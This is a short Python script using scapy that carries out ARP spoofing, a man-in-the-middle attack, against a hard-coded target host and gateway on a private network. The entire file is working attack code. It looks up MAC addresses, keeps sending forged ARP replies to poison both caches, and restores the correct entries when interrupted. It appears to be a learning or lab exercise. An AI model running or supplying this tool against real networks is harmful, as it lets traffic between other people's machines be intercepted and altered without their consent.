TARGET_IP = "192.168.68.103"
GATEWAY_IP = "192.168.68.1"

import scapy.all as scapy

def restore_defaults(dest , source):
    #getting the original MACs
    target_mac = wait_till_mac_found(dest)
    source_mac = wait_till_mac_found(source)
    #creating the packet
    packet = scapy.ARP(op=2,pdst=dest,hwdst= target_mac ,psrc=source , hwsrc = source_mac   )
    #sending
    scapy.send(packet , verbose =False)
def get_mac(ip):
    #request with the ip of the target
    request = scapy.ARP(pdst=ip)
    #broadcast packet creation
    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
    # concat packets
    final_packet = broadcast / request
    #response
    answer = scapy.srp(final_packet , timeout = 2 ,verbose = False)[0]
    if answer:
        # getting the MAC (its src because its a response)
        return answer[0][1].hwsrc

    return None
def wait_till_mac_found(ip):
    mac =None
    while not mac:
        mac = get_mac(ip)
        if not mac:
            print("mac of {} not found yet".format(ip))
    return mac

# we will send the packet to the target by pretending being the spoofed
def spoofing(target, spoofed):
    #getting the mac of the target
    mac = wait_till_mac_found(target)
    #generating the spoofed packet modifying the source and the target
    packet = scapy.ARP(op =  "is-at" , hwdst=mac , pdst = target ,psrc = spoofed )
    #sending
    scapy.send(packet , verbose = False)


def main():
    try:
        print("spoofing in progress")
        while True:
            spoofing(TARGET_IP, GATEWAY_IP) # router (source, dest -> attacker machine)
            spoofing(GATEWAY_IP, TARGET_IP) # win PC
    except KeyboardInterrupt:
        print("[!] Process stopped. Restoring defaults .. please hold")
        restore_defaults(TARGET_IP, GATEWAY_IP) # router (source, dest -> attacker machine)
        restore_defaults(GATEWAY_IP, TARGET_IP) # win PC
        exit(0)

if __name__ == "__main__":
    main()